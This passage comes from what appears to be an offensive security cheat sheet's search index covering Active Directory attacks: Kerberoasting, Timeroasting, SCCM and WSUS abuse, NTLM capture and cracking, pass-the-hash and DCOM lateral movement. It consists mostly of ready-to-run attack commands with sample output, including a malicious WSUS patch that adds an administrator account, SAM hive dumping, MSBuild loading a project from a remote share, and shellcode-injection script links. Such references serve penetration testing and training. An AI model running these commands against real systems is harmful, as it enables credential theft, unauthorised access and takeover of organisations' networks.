service is running as.</p> <ul> <li> <p>GetUserSPNs from Impacket Suite   <pre><code>$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request\n\nImpacket v0.9.17 - Copyright 2002-2018 Core Security Technologies\n\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           \n--------------------  -------------  --------------------------------------------------------  -------------------  -------------------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 \n\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2\n</code></pre></p> </li> <li> <p>CrackMapExec Module   <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt\nLDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)\nLDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9\n</code></pre></p> </li> <li> <p>Rubeus <pre><code># Stats\nRubeus.exe kerberoast /stats\n-------------------------------------   ----------------------------------\n| Supported Encryption Type | Count |  | Password Last Set Year | Count |\n-------------------------------------  ----------------------------------\n| RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |\n-------------------------------------  ----------------------------------\n\n# Kerberoast (RC4 ticket)\nRubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt\n\n# Kerberoast (AES ticket)\n# Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.\nRubeus.exe kerberoast /tgtdeleg\n\n# Kerberoast (RC4 ticket)\n# The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.\nRubeus.exe kerberoast /rc4opsec\n</code></pre></p> </li> <li> <p>PowerView <pre><code>Request-SPNTicket -SPN \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\"\n</code></pre></p> </li> <li> <p>bifrost on macOS machine   <pre><code>./bifrost -action asktgs -ticket doIF&lt;...snip...&gt;QUw= -service host/dc1-lab.lab.local -kerberoast true\n</code></pre></p> </li> <li> <p>targetedKerberoast <pre><code># for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), \n# print the \"kerberoast\" hash, and delete the temporary SPN set for that operation\ntargetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]\n</code></pre></p> </li> </ul> <p>Then crack the ticket using the correct hashcat mode (<code>$krb5tgs$23</code>= <code>etype 23</code>) </p> Mode Description <code>13100</code> Kerberos 5 TGS-REP etype 23 (RC4) <code>19600</code> Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) <code>19700</code> Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) <pre><code>./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt\n./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt\n</code></pre> <p>Mitigations: </p> <ul> <li>Have a very long password for your accounts with SPNs (&gt; 32 characters)</li> <li>Make sure no users have SPNs</li> </ul>"},{"location":"active-directory/ad-roasting-kerberoasting/#references","title":"References","text":"<ul> <li>Abusing Kerberos: Kerberoasting - Haboob Team</li> <li>Invoke-Kerberoast - Powersploit Read the docs</li> <li>Kerberoasting - Part 1 - Mubix \u201cRob\u201d Fuller</li> <li>Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman</li> </ul>"},{"location":"active-directory/ad-roasting-timeroasting/","title":"Roasting - Timeroasting","text":"<p>Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID</p> <ul> <li>SecuraBV/Timeroast - Timeroasting scripts by Tom Tervoort     <pre><code>sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt\nhashcat -m 31300 ntp-hashes.txt\n</code></pre></li> </ul>"},{"location":"active-directory/ad-roasting-timeroasting/#references","title":"References","text":"<ul> <li>Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023</li> <li>TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort</li> </ul>"},{"location":"active-directory/ad-tricks/","title":"Active Directory - Tricks","text":""},{"location":"active-directory/ad-tricks/#kerberos-clock-synchronization","title":"Kerberos Clock Synchronization","text":"<p>In Kerberos, time is used to ensure that tickets are valid. To achieve this, the clocks of all Kerberos clients and servers in a realm must be synchronized to within a certain tolerance. The default clock skew tolerance in Kerberos is <code>5 minutes</code>, which means that the difference in time between the clocks of any two Kerberos entities should be no more than 5 minutes.</p> <ul> <li>Detect clock skew automatically with <code>nmap</code> <pre><code>$ nmap -sV -sC 10.10.10.10\nclock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s\n</code></pre></li> <li>Compute yourself the difference between the clocks   <pre><code>nmap -sT 10.10.10.10 -p445 --script smb2-time -vv\n</code></pre></li> <li>Fix #1: Modify your clock   <pre><code>sudo date -s \"14 APR 2015 18:25:16\" # Linux\nnet time /domain /set # Windows\n</code></pre></li> <li>Fix #2: Fake your clock   <pre><code>faketime -f '+8h' date\n</code></pre></li> </ul>"},{"location":"active-directory/ad-tricks/#references","title":"References","text":"<ul> <li>BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 &amp; @5ub34x</li> <li>Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh</li> <li>Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss</li> <li>How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous</li> </ul>"},{"location":"active-directory/deployment-sccm/","title":"Deployment - SCCM","text":""},{"location":"active-directory/deployment-sccm/#application-deployment","title":"Application Deployment","text":"<p>SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.</p> <ul> <li>PowerSCCM - PowerShell module to interact with SCCM deployments</li> <li> <p>MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage</p> </li> <li> <p>Using SharpSCCM <pre><code>.\\SharpSCCM.exe get device --server &lt;SERVER8NAME&gt; --site-code &lt;SITE_CODE&gt;\n.\\SharpSCCM.exe &lt;server&gt; &lt;sitecode&gt; exec -d &lt;device_name&gt; -r &lt;relay_server_ip&gt;\n.\\SharpSCCM.exe exec -d WS01 -p \"C:\\Windows\\System32\\ping 10.10.10.10\" -s --debug\n</code></pre></p> </li> <li>Compromise client, use locate to find management server      <pre><code>MalSCCM.exe locate\n</code></pre></li> <li>Enumerate over WMI as an administrator of the Distribution Point     <pre><code>MalSCCM.exe inspect /server:&lt;DistributionPoint Server FQDN&gt; /groups\n</code></pre></li> <li>Compromise management server, use locate to find primary server</li> <li>Use <code>inspect</code> on primary server to view who you can target     <pre><code>MalSCCM.exe inspect /all\nMalSCCM.exe inspect /computers\nMalSCCM.exe inspect /primaryusers\nMalSCCM.exe inspect /groups\n</code></pre></li> <li> <p>Create a new device group for the machines you want to laterally move too     <pre><code>MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device\nMalSCCM.exe inspect /groups\n</code></pre></p> </li> <li> <p>Add your targets into the new group      <pre><code>MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL\n</code></pre></p> </li> <li> <p>Create an application pointing to a malicious EXE on a world readable share : <code>SCCMContentLib$</code> <pre><code>MalSCCM.exe app /create /name:demoapp /uncpath:\"\\\\BLORE-SCCM\\SCCMContentLib$\\localthread.exe\"\nMalSCCM.exe inspect /applications\n</code></pre></p> </li> <li> <p>Deploy the application to the target group      <pre><code>MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment\nMalSCCM.exe inspect /deployments\n</code></pre></p> </li> <li> <p>Force the target group to checkin for updates      <pre><code>MalSCCM.exe checkin /groupname:TargetGroup\n</code></pre></p> </li> <li> <p>Cleanup the application, deployment and group     <pre><code>MalSCCM.exe app /cleanup /name:demoapp\nMalSCCM.exe group /delete /groupname:TargetGroup\n</code></pre></p> </li> </ul>"},{"location":"active-directory/deployment-sccm/#network-access-accounts","title":"Network Access Accounts","text":"<p>If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.</p> <p>On the machine</p> <ul> <li>Find SCCM blob     <pre><code>Get-Wmiobject -namespace \"root\\ccm\\policy\\Machine\\ActualConfig\" -class \"CCM_NetworkAccessAccount\"\nNetworkAccessPassword : &lt;![CDATA[E600000001...8C6B5]]&gt;\nNetworkAccessUsername : &lt;![CDATA[E600000001...00F92]]&gt;\n</code></pre></li> <li>Using GhostPack/SharpDPAPI or Mayyhem/SharpSCCM for SCCM retrieval and decryption     <pre><code>.\\SharpDPAPI.exe SCCM\n.\\SharpSCCM.exe get naa -u USERNAME -p PASSWORD\n</code></pre></li> <li>Check ACL for the CIM repository located at <code>C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA</code>:     <pre><code>Get-Acl C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA | Format-List -Property PSPath,sddl\nConvertFrom-SddlString \"\"\n</code></pre></li> </ul> <p>From a remote machine. * Using garrettfoster13/sccmhunter <pre><code>python3 ./sccmhunter.py http -u \"administrator\" -p \"P@ssw0rd\" -d internal.lab -dc-ip 10.10.10.10. -auto\n</code></pre></p>"},{"location":"active-directory/deployment-sccm/#sccm-shares","title":"SCCM Shares","text":"<p>Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares</p> <ul> <li>1njected/CMLoot <pre><code>Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt\nInvoke-CMLootDownload -SingleFile \\\\sccm\\SCCMContentLib$\\DataLib\\SC100001.1\\x86\\MigApp.xml\nInvoke-CMLootDownload -InventoryFile .\\sccmfiles.txt -Extension msi\n</code></pre></li> </ul>"},{"location":"active-directory/deployment-sccm/#references","title":"References","text":"<ul> <li>Network Access Accounts are evil\u2026 - ROGER ZANDER - 13 SEP 2015</li> <li>The Phantom Credentials of SCCM: Why the NAA Won\u2019t Die - Duane Michael - Jun 28</li> <li>Introducing MalSCCM - Phil Keeble -May 4, 2022</li> <li>Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022</li> <li>Exploring SCCM by Unobfuscating Network Access Accounts - @xpn - Posted on 2022-07-09</li> <li>Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022</li> </ul>"},{"location":"active-directory/deployment-wsus/","title":"Deployment - WSUS","text":"<p>Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network</p> <p> The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.</p> <ul> <li> <p>SharpWSUS</p> </li> <li> <p>Locate using <code>HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate</code> or <code>SharpWSUS.exe locate</code></p> </li> <li>After WSUS Server compromise: <code>SharpWSUS.exe inspect</code></li> <li>Create a malicious patch: <code>SharpWSUS.exe create /payload:\"C:\\Users\\ben\\Documents\\pk\\psexec.exe\" /args:\"-accepteula -s -d cmd.exe /c \\\"net user WSUSDemo Password123! /add ^&amp; net localgroup administrators WSUSDemo /add\\\"\" /title:\"WSUSDemo\"</code></li> <li>Deploy it on the target: <code>SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\"Demo Group\"</code></li> <li>Check status deployment: <code>SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local</code></li> <li>Clean up: <code>SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\u201dDemo Group</code></li> </ul>"},{"location":"active-directory/hash-capture/","title":"Hash - Capture and Cracking","text":""},{"location":"active-directory/hash-capture/#capturing-and-cracking-net-ntlmv1ntlmv1-hashestokens","title":"Capturing and cracking Net-NTLMv1/NTLMv1 hashes/tokens","text":"<p>Net-NTLMv1 (NTLMv1) authentication tokens are used for network authentication. They are derived from a challenge/response DES-based algorithm with the user's NT-hash as symetric keys. </p> <p> : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to NetNTLMv1 Challenge/Response authentication. This uses the outdated encryption method DES to protect the NT/LM Hashes.</p> <p>Requirements:</p> <ul> <li>LmCompatibilityLevel = 0x1: Send LM &amp; NTLM (<code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel</code>)</li> </ul> <p>Exploitation:</p> <ul> <li>Capturing using Responder: Edit the <code>/etc/responder/Responder.conf</code> file to include the magical 1122334455667788 challenge     <pre><code>HTTPS = On\nDNS = On\nLDAP = On\n...\n; Custom challenge.\n; Use \"Random\" for generating a random challenge for each requests (Default)\nChallenge = 1122334455667788\n</code></pre></li> <li>Fire Responder: <code>responder -I eth0 --lm</code>, if <code>--disable-ess</code> is set, extended session security will be disabled for NTLMv1 authentication</li> <li>Force a callback:     <pre><code>PetitPotam.exe Responder-IP DC-IP # Patched around August 2021\nPetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users\n</code></pre></li> <li>If you got some <code>NetNTLMv1 tokens</code>, you can try to shuck them online via Shuck.Sh or locally/on-premise via ShuckNT to get NT-hashes corresponding from HIBP database. If the NT-hash has previously leaked, the NetNTLMv1 is converted to NT-hash (pass-the-hash ready) instantly. The shucking process works for any NetNTLMv1 with or without ESS/SSP (challenge != <code>1122334455667788</code>) but mainly for user account (plaintext previsouly leaked).     <pre><code># Submit NetNTLMv1 online to https://shuck.sh/get-shucking.php\n# Or shuck them on-premise via ShuckNT script:\n$ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin\n[...]\n10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.\n[INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788\n        [NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B\n</code></pre></li> <li>If you got some <code>NetNTLMv1 tokens</code>, you can also try to crack them via Crack.Sh (cloud service when available, more time and potentially chargeable). For this you need to format them to submit them on Crack.Sh. The Converter of Shuck.Sh can be used to convert format easily.     <pre><code># When there is no-ESS/SSP and the challenge is set to 1122334455667788, it's free (0$):\nusername::hostname:response:response:challenge -&gt; NTHASH:response\nNTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972\n\n# When there is ESS/SSP or challenge != 1122334455667788, it's chargeable from $20-$200:\nusername::hostname:lmresponse+0padding:ntresponse:challenge -&gt; $NETNTLM$challenge$ntresponse\n$NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E\n</code></pre></li> <li>Finaly, if no Shuck.Sh nor Crack.Sh can be used, you can try to break NetNTLMv1 with Hashcat / John The Ripper     <pre><code>john --format=netntlm hash.txt\nhashcat -m 5500 -a 3 hash.txt # for NetNTLMv1(-ESS/SSP) to plaintext (for user account)\nhashcat -m 27000 -a 0 hash.txt nthash-wordlist.txt # for NetNTLMv1(-ESS/SSP) to NT-hash (for user and computer account, depending on nthash-wordlist quality)\nhashcat -m 14000 -a 3 inputs.txt --hex-charset -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1 # for NetNTLMv1(-ESS/SSP) to DES-keys (KPA-attack) of user/computer account with 100% success rate, then regenerate NT-hash with these DES-keys on https://shuck.sh/converter.php.\n</code></pre></li> <li>Now you can DCSync using the Pass-The-Hash with the DC machine account</li> </ul> <p> NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= <code>1122334455667788</code>, so chargeable on Crack.Sh).</p> <p> NetNTLMv1 format is <code>login::domain:lmresp:ntresp:clientChall</code>. If the <code>lmresp</code> contains a 0's-padding this means that the token is protected by ESS/SSP.</p> <p> NetNTLMv1 final challenge is the Responder's challenge itself (<code>1122334455667788</code>) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the Shuck.Sh Generator and detailed in MISCMag#128.</p> <p> If you get some tokens from other tools (hostapd-wpe or chapcrack) in other formats, like tokens starting with the prefix <code>$MSCHAPv2$</code>, <code>$NETNTLM$</code> or <code>$99$</code>, they correspond to a classic NetNTLMv1 and can be converted from one format to another here.</p> <p>Mitigations: </p> <ul> <li>Set the Lan Manager authentication level to <code>Send NTLMv2 responses only. Refuse LM &amp; NTLM</code></li> </ul>"},{"location":"active-directory/hash-capture/#capturing-and-cracking-net-ntlmv2ntlmv2-hashes","title":"Capturing and cracking Net-NTLMv2/NTLMv2 hashes","text":"<p>If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network.</p> <pre><code># https://github.com/lgandx/Responder\n$ sudo ./Responder.py -I eth0 -wfrd -P -v\n\n# https://github.com/Kevin-Robertson/InveighZero\nPS &gt; .\\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]\n\n# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1\nPS &gt; Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y \u2013mDNS Y \u2013Proxy Y -MachineAccounts Y\n</code></pre> <p>Crack the hashes with Hashcat / John The Ripper</p> <pre><code>john --format=netntlmv2 hash.txt\nhashcat -m 5600 -a 3 hash.txt\n</code></pre>"},{"location":"active-directory/hash-capture/#references","title":"References","text":"<ul> <li>NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021</li> </ul>"},{"location":"active-directory/hash-over-pass-the-hash/","title":"Hash - OverPass-the-Hash","text":"<p>In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).</p>"},{"location":"active-directory/hash-over-pass-the-hash/#using-impacket","title":"Using impacket","text":"<pre><code>root@kali:~$ python ./getTGT.py -hashes \":1a59bd44fe5bec39c44c8cd3524dee\" lab.ropnop.com\nroot@kali:~$ export KRB5CCNAME=\"/root/impacket-examples/velociraptor.ccache\"\nroot@kali:~$ python3 psexec.py \"jurassic.park/velociraptor@labwws02.jurassic.park\" -k -no-pass\n\n# also with the AES Key if you have it\nroot@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com\n\nroot@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5\nroot@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM\nroot@kali:~$ klist\n</code></pre>"},{"location":"active-directory/hash-over-pass-the-hash/#using-rubeus","title":"Using Rubeus","text":"<pre><code># Request a TGT as the target user and pass it into the current session\n# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs\n.\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt\n\n# More stealthy variant, but requires the AES256 hash\n.\\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt\n\n# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)\n.\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\\Windows\\System32\\cmd.exe\n</code></pre>"},{"location":"active-directory/hash-pass-the-hash/","title":"Hash - Pass-the-Hash","text":"<p>The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren\u2019t the built-in RID 500.</p> <ul> <li>Metasploit   <pre><code>use exploit/windows/smb/psexec\nset RHOST 10.2.0.3\nset SMBUser jarrieta\nset SMBPass nastyCutt3r  \n# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.\n# NOTE2: Require the full NT hash, you may need to add the \"blank\" LM (aad3b435b51404eeaad3b435b51404ee)\nset PAYLOAD windows/meterpreter/bind_tcp\nrun\nshell\n</code></pre></li> <li>CrackMapExec   <pre><code>cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x \"whoami\"\n</code></pre></li> <li>Impacket suite   <pre><code>proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d\n</code></pre></li> <li>Windows RDP and mimikatz   <pre><code>sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863\nsekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the users ntlm hash&gt; /run:\"mstsc.exe /restrictedadmin\"\n</code></pre></li> </ul> <p>You can extract the local SAM database to find the local administrator hash :</p> <pre><code>C:\\&gt; reg.exe save hklm\\sam c:\\temp\\sam.save\nC:\\&gt; reg.exe save hklm\\security c:\\temp\\security.save\nC:\\&gt; reg.exe save hklm\\system c:\\temp\\system.save\n$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n</code></pre>"},{"location":"active-directory/hash-pass-the-hash/#references","title":"References","text":"<ul> <li>Passing the hash with native RDP client (mstsc.exe)</li> </ul>"},{"location":"active-directory/internal-dcom/","title":"Internal - DCOM","text":"<p>DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.</p> <ul> <li>Impacket DCOMExec.py   <pre><code>dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]\ndcomexec.py -share C$ -object MMC20 '&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;'\ndcomexec.py -share C$ -object MMC20 '&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;MACHINE_CIBLE&gt;' 'ipconfig'\n\npython3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\\$@$HOST 'notepad.exe'\n# -object MMC20 specifies that we wish to instantiate the MMC20.Application object.\n# -silentcommand executes the command without attempting to retrieve the output.\n</code></pre></li> <li>CheeseTools - https://github.com/klezVirus/CheeseTools   <pre><code># https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/\n-t, --target=VALUE         Target Machine\n-b, --binary=VALUE         Binary: powershell.exe\n-a, --args=VALUE           Arguments: -enc &lt;blah&gt;\n-m, --method=VALUE         Methods: MMC20Application, ShellWindows,\n                            ShellBrowserWindow, ExcelDDE, VisioAddonEx,\n                            OutlookShellEx, ExcelXLL, VisioExecLine, \n                            OfficeMacro\n-r, --reg, --registry      Enable registry manipulation\n-h, -?, --help             Show Help\n\nCurrent Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro.\n</code></pre></li> <li>Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1   <pre><code>Import-Module .\\Invoke-DCOM.ps1\nInvoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart \"MyService\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command \"calc.exe\"\nInvoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command \"calc.exe\"\n</code></pre></li> </ul>"},{"location":"active-directory/internal-dcom/#dcom-via-mmc-application-class","title":"DCOM via MMC Application Class","text":"<p>This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named \"ExecuteShellCommand\" under Document.ActiveView.</p> <pre><code>PS C:\\&gt; $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\"))\nPS C:\\&gt; $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\calc.exe\",$null,$null,7)\nPS C:\\&gt; $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\",$null,\"-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; \",\"7\")\n\n# Weaponized example with MSBuild\nPS C:\\&gt; [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\",$null,\"\\\\10.10.10.2\\webdav\\build.xml\",\"7\")\n</code></pre> <p>Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1</p>"},{"location":"active-directory/internal-dcom/#dcom-via-office","title":"DCOM via Office","text":"<ul> <li>Excel.Application</li> <li>DDEInitiate</li> <li>RegisterXLL</li> <li>Outlook.Application</li> <li>CreateObject-&gt;Shell.Application-&gt;ShellExecute</li> <li>CreateObject-&gt;ScriptControl (office-32bit only)</li> <li>Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)</li> <li>Addons</li> <li>ExecuteLine</li> <li>Word.Application</li> <li>RunAutoMacro</li> </ul> <pre><code># Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM\nInvoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9\nInvoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a\n\n# Using Excel DDE\nPS C:\\&gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))\nPS C:\\&gt; $excel.DisplayAlerts = $false\nPS C:\\&gt; $excel.DDEInitiate(\"cmd\", \"/c calc.exe\")\n\n# Using Excel RegisterXLL\n# Can't be used reliably with a remote target\nRequire: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1\nPS&gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\"))\nPS&gt; $excel.RegisterXLL(\"EvilXLL.dll\")\n\n# Using Visio\n$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\"))\n$visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\")\n</code></pre>"},{"location":"active-directory/internal-dcom/#dcom-via-shellexecute","title":"DCOM via ShellExecute","text":"<pre><code>$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\"10.10.10.1\")\n$obj = [System.Activator]::CreateInstance($com)\n$item = $obj.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n</code></pre>"},{"location":"active-directory/internal-dcom/#dcom-via-shellbrowserwindow","title":"DCOM via ShellBrowserWindow","text":"<p> Windows 10 only, the object doesn't exists in Windows 7</p> <pre><code>$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',\"10.10.10.1\")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n</code></pre>"},{"location":"active-directory/internal-dcom/#references","title":"References","text":"<ul> <li>Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017</li> <li>New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018</li> </ul>"},{"location":"active-directory/internal-mitm-relay/","title":"Internal - MITM and Relay","text":"<p>NTLMv1 and NTLMv2 can be relayed to connect to another machine.</p> Hash Hashcat Attack method LM <code>3000</code> crack/pass the hash NTLM/NTHash <code>1000</code> crack/pass the hash NTLMv1/Net-NTLMv1 <code>5500</code> crack/relay attack NTLMv2/Net-NTLMv2 <code>5600</code> crack/relay attack <p>Crack the hash with <code>hashcat</code>.</p> <pre><code>hashcat -m 5600 -a 0 hash.txt crackstation.txt\n</code></pre>"},{"location":"active-directory/internal-mitm-relay/#ms08-068-ntlm-reflection","title":"MS08-068 NTLM 